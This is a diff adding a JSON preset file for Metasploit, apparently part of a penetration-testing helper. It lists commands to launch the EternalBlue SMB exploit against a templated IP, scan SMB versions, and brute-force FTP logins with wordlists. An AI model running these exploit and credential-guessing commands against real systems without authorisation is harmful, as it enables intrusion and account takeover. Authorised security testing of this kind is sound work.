@@ -1,0 +1,20 @@
+{
+  "output_file": "metasploit.txt",
+  "presets": [
+    {
+      "name": "basic-exploit",
+      "description": "Run a basic exploit module.",
+      "command": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; exploit"
+    },
+    {
+      "name": "scan-smb",
+      "description": "Scan for SMB vulnerabilities.",
+      "command": "use auxiliary/scanner/smb/smb_version; set RHOSTS {ip}; run"
+    },
+    {
+      "name": "ftp-login",
+      "description": "Test FTP credentials.",
+      "command": "use auxiliary/scanner/ftp/ftp_login; set RHOSTS {ip}; set USER_FILE /usr/share/wordlists/usernames.txt; set PASS_FILE /usr/share/wordlists/passwords.txt; run"
+    }
+  ]
+}
